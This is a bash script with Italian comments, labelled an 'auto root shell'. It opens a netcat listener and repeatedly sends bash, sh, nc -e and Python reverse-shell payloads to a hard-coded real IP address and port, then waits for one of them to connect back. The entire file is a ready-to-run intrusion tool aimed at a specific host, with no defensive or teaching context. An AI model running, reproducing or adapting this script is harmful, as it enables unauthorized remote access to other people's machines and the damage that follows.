#!/bin/bash
# 🔥 AUTO ROOT SHELL - NO RlWRAP RICHIESTO
# 100% AUTOMATICO + UI pulita

# AUTO IP
MY_IP=$(curl -s ifconfig.me 2>/dev/null || curl -s ident.me 2>/dev/null || curl -s icanhazip.com 2>/dev/null || echo "127.0.0.1")
PORT=4444
TARGET="63.164.100.214:9091"

clear
cat << EOF
╔══════════════════════════════════════╗
║       🚀 ROOT BASH TERMINAL          ║
║    IP: $MY_IP:$PORT  →  $TARGET      ║
╚══════════════════════════════════════╝
EOF

# KILL LISTENER
pkill nc 2>/dev/null
sleep 1

# LISTENER + UI
{
    echo -e "\n🎧 Listener attivo su $MY_IP:$PORT"
    echo "⏳ Invio reverse shells... (attendi 15s)"
    echo "══════════════════════════════════════"
    
    # LISTENER SEMPLICE (NO rlwrap)
    nc -lvnp $PORT
    
} &

sleep 3

# REVERSE SHELLS MULTIPLI
for i in {1..10}; do
    echo -e "\n📤 Shell $i/10..."
    
    # Bash reverse
    (echo "bash -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w3 $TARGET >/dev/null 2>&1) &
    
    # Sh reverse  
    (echo "sh -i >& /dev/tcp/$MY_IP/$PORT 0>&1" | nc -w3 $TARGET >/dev/null 2>&1) &
    
    # NC exec
    (echo "nc -e /bin/bash $MY_IP $PORT" | nc -w3 $TARGET >/dev/null 2>&1) &
    
    # Python mini
    (python3 -c "import socket,subprocess,os;s=socket.socket();s.connect(('$MY_IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh'],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())" | nc -w3 $TARGET >/dev/null 2>&1) &
    
    sleep 1.5
done

echo -e "\n✅ TUTTE SHELL INVIATE!"
echo "🎯 SHELL SI CONNETTERÀ QUI ↓"
echo "══════════════════════════════════════"

# Attendi forever
wait
